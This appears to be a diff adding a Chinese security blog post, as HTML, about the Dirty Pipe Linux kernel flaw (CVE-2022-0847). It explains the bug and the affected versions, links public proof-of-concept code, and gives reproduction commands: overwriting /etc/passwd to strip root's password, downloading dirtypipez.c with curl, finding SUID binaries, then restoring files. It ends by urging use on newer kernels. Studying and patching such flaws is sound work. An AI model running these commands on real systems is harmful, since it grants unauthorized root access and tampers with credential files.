@@ -1,0 +1,270 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>DirtyPipe(脏管道)提权 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    DirtyPipe(脏管道)提权
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-08 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/pe3-Tsqw7/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="dirtypipe提权">DirtyPipe提权</h1>
+<p><strong>CVE-2022-0847</strong></p>
+<h2 id="漏洞详情">漏洞详情</h2>
+<p>新管道缓冲区结构的“flags”成员在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化的方式存在缺陷，因此可能包含陈旧的值。非特权本地用户可通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”</p>
+<h2 id="漏洞范围">漏洞范围</h2>
+<ul>
+<li>version &gt; 5.8</li>
+<li>version &lt; 5.16.11、5.15.25、5.10.102</li>
+</ul>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>现在存在两个POC</p>
+<h3 id="poc-1">POC-1</h3>
+<pre><code>https://dirtypipe.cm4all.com/
+https://github.com/imfiver/CVE-2022-0847/blob/main/Dirty-Pipe.sh
+</code></pre>
+<p>这里的sh脚本添加了以下命令</p>
+<pre><code>gcc exp.c -o exp -std=c99
+
+# 备份密码文件
+cp /etc/passwd /tmp/passwd
+passwd_tmp=$(cat /etc/passwd|head)
+./exp /etc/passwd 1 &quot;${passwd_tmp/root:x/oot:}&quot;
+
+echo -e &quot;\n# 恢复原来的密码\nrm -rf /etc/passwd\nmv /tmp/passwd /etc/passwd&quot;
+
+# 现在可以无需密码切换到root账号
+su root
+</code></pre>
+<h4 id="原理">原理</h4>
+<p>首先编译，编译后备份密码文件然后通过exp去写/etc/passwd来提权。将root所在的那一行，第一个冒号后面的x去掉</p>
+<ul>
+<li>/etc/passwd的第二列通常设置为x，表示用户密码保存在/etc/shadow中，而/etc/shadow文件只有root用户可以读取和写入，这样就保护了密码哈希不能被第三方爆破。</li>
+</ul>
+<p>最后在后面用户描述的位置多加一个字符，补齐文件长度。最后成功修改/etc/passwd，然后再使用su即可直接免密码切换到root了。</p>
+<pre><code>git clone https://github.com/imfiver/CVE-2022-0847.git
+cd CVE-2022-0847
+chmod +x Dirty-Pipe.sh
+bash Dirty-Pipe.sh
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/f77149d0961b4c32a61b1d9e5b8e939d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>然后因为修改了原来密码还需要进行恢复操作</p>
+<pre><code>rm -rf /etc/passwd
+mv /tmp/passwd /etc/passwd
+</code></pre>
+<h3 id="poc-2">POC-2</h3>
+<pre><code>curl -O https://haxx.in/files/dirtypipez.c
+</code></pre>
+<p>查找具有suid权限的可执行文件</p>
+<pre><code>find / -user root -perm /4000 2&gt;/dev/null
+</code></pre>
+<p>编译POC文件后，指定修改的Suid可执行文件，获取root权限</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/0bc358d70e03431abd1473200a0d375f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h4 id="原理-2">原理</h4>
+<p>直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p>
+<h2 id="总结">总结</h2>
+<p>漏洞利用比脏牛还简单且无硬性要求，但是影响内核比较新。在面对比较新的内核系统时可积极使用</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/spring-cloud-gateway-rce/" class="post-title gt-a-link">
+                    Spring Cloud Gateway Rce
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/dirtypipezang-guan-dao-ti-quan/" class="leancloud_visitors" data-flag-title="DirtyPipe(脏管道)提权">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
